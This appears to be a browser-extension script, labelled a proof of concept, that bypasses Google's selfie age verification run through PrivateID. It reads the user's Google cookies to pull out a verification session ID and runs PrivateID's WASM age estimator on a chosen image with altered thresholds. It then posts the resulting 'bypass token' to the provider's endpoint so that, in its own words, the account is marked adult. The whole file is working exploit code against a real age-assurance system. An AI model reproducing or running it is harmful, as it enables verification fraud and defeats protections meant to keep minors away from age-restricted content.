function log(msg, type = "info") {
    console.log(`[POC] ${msg}`);
    const statusText = document.getElementById('status-text');
    const outputPre = document.getElementById('output');

    if (statusText) {
        statusText.textContent = msg;
        statusText.style.color = type === "error" ? "#f38ba8" : "#a6e3a1"; // Red or Green
    }

    if (outputPre) {
        const timestamp = new Date().toLocaleTimeString();
        outputPre.textContent += `[${timestamp}] ${msg}\n`;
        outputPre.scrollTop = outputPre.scrollHeight;
    }
}

function updateProgress(percent) {
    const bar = document.getElementById('progress-bar');
    const container = document.getElementById('progress-container');
    if (bar && container) {
        container.style.display = 'block';
        bar.style.width = `${percent}%`;
    }
}

function resetProgress() {
    const container = document.getElementById('progress-container');
    if (container) container.style.display = 'none';
    const outputPre = document.getElementById('output');
    if (outputPre) outputPre.textContent = "";
}

// Initialize Worker Management
let worker = null;
let wasmService = null;

function resetWorker() {
    if (worker) {
        worker.terminate();
        log("Cleaning up previous worker instance...");
    }
    worker = new Worker('worker.js');
    wasmService = Comlink.wrap(worker);
}

// Helper: Fetch Session ID using Chrome Cookies
async function fetchSessionId() {
    log("Fetching Google Cookies...");
    if (!chrome || !chrome.cookies) {
        throw new Error("Chrome Cookies API not available.");
    }

    const cookies = await chrome.cookies.getAll({ domain: "google.com" });
    if (!cookies || cookies.length === 0) {
        throw new Error("No cookies found for google.com. Please log in.");
    }

    const targetUrl = 'https://myaccount.google.com/_/IdentityVerificationAgeUi/data/batchexecute?rpcids=QzDH2&source-path=%2Fage-verification%2Fselfie%2Fprivateid%2Finit&f.sid=3781132860958623727&bl=boq_identityaccountsettingsuiserver_20251209.14_p0&hl=en&soc-app=1&soc-platform=1&soc-device=1&_reqid=347267&rt=c';
    const bodyData = 'f.req=%5B%5B%5B%22QzDH2%22%2C%22%5Bnull%2Cnull%2C%5B1%2Cnull%2C%5Bnull%2Cnull%2Cnull%2C%5C%22OGB%5C%22%2C%5C%22act%5C%22%5D%5D%2Cnull%2Cnull%2C0%2C0%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=APvFC21PGD9b492ezei-ggjswkV0%3A1765480062947&';

    const response = await fetch(targetUrl, {
        method: 'POST',
        headers: {
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'x-same-domain': '1',
        },
        body: bodyData,
        credentials: 'include'
    });

    if (!response.ok) throw new Error("Google API request failed.");
    const text = await response.text();

    const uuidRegex = /sessionId.*?([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})/;
    const match = text.match(uuidRegex);

    if (!match || !match[1]) throw new Error("Session ID not found in response.");
    return match[1];
}

// Validate / Verify Function
async function validateAndVerify(token, sessionId) {
    log("Validating Token with Server (POST /face)...");
    updateProgress(90);

    // https://api-age-verification.privateid.com/session/{uuid}/face
    const url = `https://api-age-verification.privateid.com/session/${sessionId}/face`;

    const payload = JSON.stringify({
        "result": token
    });

    log(`Posting to ${url}`);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'NONE_FOR_TESTING',
                'X-Api-Key': '0000000000000000test',
            },
            body: payload
        });

        const result = await response.json();
        log("Server Validation Response: " + JSON.stringify(result, null, 2));
        return result;

    } catch (e) {
        log("Validation Error: " + e.message, "error");
        throw e;
    }
}

// Core Execution Flow
async function executeExploit(mode) {
    // Mode: 
    // 0: Manual (No Val) - No face request
    // 1: Manual (Val) - Face request
    // 2: Auto (No Val) - No face request
    // 3: Auto (Val + Verify) - Face request, and makes your account an adult

    resetProgress();
    updateProgress(5);

    // Reset Worker for a clean state every run
    resetWorker();

    let sessionId = document.getElementById('sessionId').value.trim();
    const isAuto = (mode === 2 || mode === 3);
    const shouldValidate = (mode === 1 || mode === 3);

    try {
        // Step 1: Session ID
        if (isAuto) {
            updateProgress(10);
            try {
                sessionId = await fetchSessionId();
                document.getElementById('sessionId').value = sessionId;
                log(`Fetched Session ID: ${sessionId}`);
            } catch (e) {
                throw new Error("Auto-Fetch Failed: " + e.message);
            }
        } else {
            if (!sessionId) throw new Error("Session ID is required for Manual Mode.");
        }
        updateProgress(20);

        // Step 2: Public Key
        log("Fetching Public Key...");
        const pkResp = await fetch('https://api-orchestration.uat.privateid.com/public-key');
        if (!pkResp.ok) throw new Error("Public Key Fetch Failed");
        const pkData = await pkResp.json();
        const publicKey = pkData.publicKey;
        updateProgress(30);

        // Step 3: Initialize WASM
        log("Initializing WASM Engine...");
        await wasmService.isLoad(
            true,
            'https://api-age-verification.privateid.com',
            sessionId,
            publicKey,
            4,
            true,
            60000
        );
        updateProgress(40);

        // Step 4: Wait for Models
        log("Loading AI Models...");
        let attempts = 0;
        while (attempts < 60) {
            const loaded = await wasmService.checkIfModelsLoaded();
            if (loaded) break;
            await new Promise(r => setTimeout(r, 1000));
            attempts++;
            if (attempts % 5 === 0) log(`Waiting for models... ${attempts}s`);
        }
        if (attempts >= 60) throw new Error("Model Timeout");
        updateProgress(60);

        // Step 5: Process Image
        log("Processing Target Image...");
        const img = document.getElementById('preview');
        if (!img.complete) await new Promise(r => img.onload = r);

        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = img.naturalWidth;
        canvas.height = img.naturalHeight;
        ctx.drawImage(img, 0, 0);
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);

        const originalImages = [{
            data: new Uint8Array(imageData.data.buffer),
            width: canvas.width,
            height: canvas.height
        }];
        updateProgress(70);

        // Step 6: Generate Token config
        const config = JSON.stringify({
            "input_image_format": "rgba",
            "angle_rotation_left_threshold": 20,
            "angle_rotation_right_threshold": 20,
            "anti_spoofing_threshold": 0.7,
            "threshold_profile_predict": 0.66,
            "blur_threshold_enroll_pred": 40,
            "threshold_user_too_close": 0.65,
            "threshold_user_too_far": 0.15,
            "threshold_user_up": 0.15,
            "threshold_user_down": 0.9,
            "threshold_user_left": 0.9,
            "threshold_user_right": 0.1,
            "threshold_high_vertical_predict": 0.9,
            "threshold_down_vertical_predict": 2.2,
            "url_name_override": "",
            "disable_predict_mf": true,
            "mf_count_override": 0,
            "disable_estimate_age_mf": true,
            "threshold_profile_enroll": 0.6,
            "allow_only_one_face": true,
            "mf_token": "",
            "mf_reset_threshold": 0,
            "mf_antispoof_on_last_frame": false,
            "disallowed_results": [6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 22, 23, 24]
        });

        // Step 7: Execute
        log("Generating Bypass Token...");
        let tokenResult = null;

        await new Promise((resolve, reject) => {
            wasmService.ultraAgeEstimate(
                originalImages,
                true,
                config,
                Comlink.proxy((operation, id, response) => {
                    log(`Callback: ${operation} [${id}]`);

                    try {
                        // Parse logic for the request key at uber_operation_result.request
                        const parsed = JSON.parse(response);
                        if (parsed.uber_operation_result && parsed.uber_operation_result.request) {
                            tokenResult = parsed.uber_operation_result.request;
                            console.log("Extracted Token:", tokenResult);
                            const out = document.getElementById('output');
                            out.textContent += `\n\n--- EXTRACTED TOKEN ---\n${tokenResult}\n`;
                        } else {
                            // Tihs should never run regardless
                            log("Warning: Could not find uber_operation_result.request. Using raw response.");
                            tokenResult = response;
                        }
                    } catch (e) {
                        log("Warning: Response is not JSON. Using raw response.");
                        tokenResult = response;
                    }
                    resolve();
                })
            ).catch(reject);
        });
        updateProgress(80);

        // Step 8: Validate if requested
        if (shouldValidate && tokenResult) {
            await validateAndVerify(tokenResult, sessionId);

            if (isAuto) {
                log("Checking session status...");
                // GET /session/{uuid} to get the redirect URL and confirm completion
                const statusUrl = `https://api-age-verification.privateid.com/session/${sessionId}`;

                const statusResp = await fetch(statusUrl, {
                    method: 'GET',
                    headers: {
                        'Authorization': 'NONE_FOR_TESTING',
                        'X-Api-Key': '0000000000000000test'
                    }
                });

                if (!statusResp.ok) throw new Error("Status check failed");
                const statusData = await statusResp.json();

                log("Status Response: " + JSON.stringify(statusData));

                if (statusData.flowStatus === 'COMPLETED' && statusData.redirectUrl) {
                    alert("Done. Sending you to the confirmation page.");
                    log(`Redirecting to: ${statusData.redirectUrl}`);
                    window.location.href = statusData.redirectUrl;
                } else {
                    log("Warning: Flow not completed or no redirect URL found. " + JSON.stringify(statusData), "error");
                }
            } else {
                log("Manual Validation Complete. No redirect performed.");
            }

        } else {
            log("Process Complete (No Validation).");
        }

        updateProgress(100);

    } catch (e) {
        console.error(e);
        log("ERROR: " + e.message, "error");
        updateProgress(0);
    }
}

document.getElementById('btn-manual-no-val').addEventListener('click', () => executeExploit(0));
document.getElementById('btn-manual-val').addEventListener('click', () => executeExploit(1));
document.getElementById('btn-auto-no-val').addEventListener('click', () => executeExploit(2));
document.getElementById('btn-auto-val').addEventListener('click', () => executeExploit(3));
